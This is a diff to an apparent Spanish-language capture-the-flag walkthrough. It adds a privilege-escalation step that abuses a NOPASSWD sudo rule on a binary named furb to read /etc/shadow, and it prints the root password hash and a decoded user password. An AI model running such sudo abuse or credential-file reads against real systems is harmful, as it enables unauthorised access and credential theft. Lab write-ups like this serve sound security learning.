@@ -69,4 +69,17 @@ bambi:c3VwZXJzZWNyZXRwYXNzd29yZDEyMw
 ```
 al deshashearlo tenemos que la contraseña para bambi es `supersecretpassword123` por lo que ya podremos acceder
 
-
+## Paso N7: Escalando privilegios
+Una vez ya en el usuario `bambi` ejecutaremos `sudo -l`
+<img width="666" height="204" alt="image" src="https://github.com/user-attachments/assets/148da29f-1fe4-4501-bde1-6fbe60fcdd49" />
+```
+(ALL : ALL) NOPASSWD: /usr/bin/furb
+```
+si aplicamos `strings /usr/bin/furb` y encontraremos una línea que dice `Error: Missing file argument for -r`, por lo que vemos que podemos usar el parámetro `-r` en furb. si ejecutamos `ls -la /usr/bin/furb` veremos que tiene permisos root, por lo que si ejecutamos
+```
+sudo -u root /usr/bin/furb -r /etc/shadow
+```
+<img width="669" height="381" alt="image" src="https://github.com/user-attachments/assets/1acd90cc-4d03-43d6-8fa3-60d637daa6bf" />
+```
+root:$y$j9T$djr/6OzFs5YQBGkXwyusg0$OJCmQMUtPM.g1Jw/6wVW9ZSEgHfnZq5EW6mPRygleO/:20249:0:99999:7:::
+```
